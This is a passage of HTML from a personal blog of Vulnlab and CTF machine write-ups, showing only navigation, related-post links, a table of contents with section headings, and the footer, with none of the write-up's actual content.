fa-fw"></i> 2024-01-20</div><div class="title">Lock - Vulnlab</div></div></a></div><div><a href="/2024/03/17/Sendai-Vulnlab/" title="Sendai - Vulnlab"><img class="cover" src="https://3528174365-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FI3I73FFqB6GvT8N5Mt1N%2Fuploads%2FRRPTVaY8c7dGLUP6fFBH%2Fsendai_slide.png?alt=media&token=b35b5833-3b44-4447-8151-0357cc2440ea&width=400&dpr=2&quality=100&sign=c62763d9c8fa3c3127537f3446c48cc764dc145cc28413a9cc3a2c16202f1376" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-17</div><div class="title">Sendai - Vulnlab</div></div></a></div><div><a href="/2023/11/02/Slonik-Vulnlab/" title="Slonik - Vulnlab"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F3c4cf065-3e0a-433a-a2d4-a1f5ee052a21%2Fspaces_I3I73FFqB6GvT8N5Mt1N_uploads_o4i6j9OnSS4TIFmGKqQT_slonik_slide.webp?table=block&id=08f6badb-b393-4cdb-beaf-fa488c1e57d0&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1020&userId=&cache=v2" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-02</div><div class="title">Slonik - Vulnlab</div></div></a></div><div><a href="/2023/10/19/Media-Vulnlab/" title="Media - Vulnlab"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F723ecb50-3ce1-43a7-8202-b53f76aa2ccf%2Fmedia.png?table=block&id=965e07b3-adbf-4f84-b843-97ecaafe658a&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1020&userId=&cache=v2" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-19</div><div class="title">Media - Vulnlab</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/cat.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">serioton</div><div class="author-info__description">noob ctf player</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://twitter.com/seriotonctf"><i class="fab fa-twitter"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/seriotonctf" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://twitter.com/seriotonctf" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">A blog where I share writeups of machines and CTF challenges</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Recon"><span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NMAP"><span class="toc-text">NMAP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shell-as-jack-black"><span class="toc-text">Shell as jack.black</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PrivEsc"><span class="toc-text">PrivEsc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-apppool-defaultapppool"><span class="toc-text">Shell as apppool\defaultapppool</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-system"><span class="toc-text">Shell as system</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/05/28/Escape-Vulnlab/" title="Escape - Vulnlab"><img src="https://wiki.vulnlab.com/~gitbook/image?url=https%3A%2F%2F3528174365-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FI3I73FFqB6GvT8N5Mt1N%252Fuploads%252Ft12lXmil2VV0iVqncZnv%252Fescape_slide.png%3Falt%3Dmedia%26token%3Dce1f8941-c579-4d9a-bb57-ea6de1e5252b&amp;width=768&amp;dpr=1&amp;quality=100&amp;sign=642a654e4f3d5c89f5bd79724228f6521b285446f0055d8b5050aced207fd1f8" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Escape - Vulnlab"/></a><div class="content"><a class="title" href="/2024/05/28/Escape-Vulnlab/" title="Escape - Vulnlab">Escape - Vulnlab</a><time datetime="2024-05-28T18:57:00.000Z" title="Created 2024-05-28 18:57:00">2024-05-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/17/Sendai-Vulnlab/" title="Sendai - Vulnlab"><img src="https://3528174365-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FI3I73FFqB6GvT8N5Mt1N%2Fuploads%2FRRPTVaY8c7dGLUP6fFBH%2Fsendai_slide.png?alt=media&amp;token=b35b5833-3b44-4447-8151-0357cc2440ea&amp;width=400&amp;dpr=2&amp;quality=100&amp;sign=c62763d9c8fa3c3127537f3446c48cc764dc145cc28413a9cc3a2c16202f1376" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Sendai - Vulnlab"/></a><div class="content"><a class="title" href="/2024/03/17/Sendai-Vulnlab/" title="Sendai - Vulnlab">Sendai - Vulnlab</a><time datetime="2024-03-17T17:13:40.000Z" title="Created 2024-03-17 17:13:40">2024-03-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/07/CrackMapExec-and-NetExec-Cheat-Sheet/" title="CrackMapExec and NetExec Cheat Sheet"><img src="https://repository-images.githubusercontent.com/689013903/3d0fa9de-9232-4caa-9a01-a80ebca9dc9c" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CrackMapExec and NetExec Cheat Sheet"/></a><div class="content"><a class="title" href="/2024/03/07/CrackMapExec-and-NetExec-Cheat-Sheet/" title="CrackMapExec and NetExec Cheat Sheet">CrackMapExec and NetExec Cheat Sheet</a><time datetime="2024-03-07T14:11:05.000Z" title="Created 2024-03-07 14:11:05">2024-03-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/20/Lock-Vulnlab/" title="Lock - Vulnlab"><img src="https://1897091482-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FI3I73FFqB6GvT8N5Mt1N%2Fuploads%2FqlrTgqfYZ2LxYiFsS7F0%2Flock_slide.png?alt=media&amp;token=4a34abe6-3e20-4725-9334-bd39e2db903a" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Lock - Vulnlab"/></a><div class="content"><a class="title" href="/2024/01/20/Lock-Vulnlab/" title="Lock - Vulnlab">Lock - Vulnlab</a><time datetime="2024-01-20T18:44:31.000Z" title="Created 2024-01-20 18:44:31">2024-01-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/14/Bamboo-Vulnlab/" title="Bamboo - Vulnlab"><img src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F32f31a6a-94e8-4f0c-a634-b4d25ddb3468%2Fbamboo_slide.webp?table=block&amp;id=4a0a5659-6394-4650-b233-d1910b3f33f8&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1030&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Bamboo - Vulnlab"/></a><div class="content"><a class="title" href="/2023/12/14/Bamboo-Vulnlab/" title="Bamboo - Vulnlab">Bamboo - Vulnlab</a><time datetime="2023-12-14T20:44:27.000Z" title="Created 2023-12-14 20:44:27">2023-12-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/train_travel_illustration-wallpaper-1920x1080.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By serioton</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">ฅ^•ﻌ•^ฅ</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div></div></body></html>